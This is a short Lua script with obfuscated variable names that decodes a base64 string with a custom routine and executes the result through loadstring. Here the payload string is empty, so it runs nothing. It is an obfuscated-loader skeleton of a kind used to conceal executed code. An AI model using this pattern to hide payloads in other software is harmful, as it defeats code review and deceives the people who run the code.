local _ahqwpm='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function _fopdphl(s)
    local _edddlfos=''
    for i=1,#s,4 do
        local a1=_ahqwpm:find(s:sub(i,i),1,true)
        local b1=_ahqwpm:find(s:sub(i+1,i+1),1,true)
        local c1=(_ahqwpm:find(s:sub(i+2,i+2),1,true) or 1)
        local d1=(_ahqwpm:find(s:sub(i+3,i+3),1,true) or 1)
        if not a1 then break end
        a1=a1-1 b1=(b1 or 1)-1 c1=c1-1 d1=d1-1
        local v=a1*262144+b1*4096+c1*64+d1
        _edddlfos=_edddlfos..string.char(math.floor(v/65536)%256)
        if s:sub(i+2,i+2)~="=" then _edddlfos=_edddlfos..string.char(math.floor(v/256)%256) end
        if s:sub(i+3,i+3)~="=" then _edddlfos=_edddlfos..string.char(v%256) end
    end
    return _edddlfos
end
local _p=""
loadstring(_fopdphl(_p))()
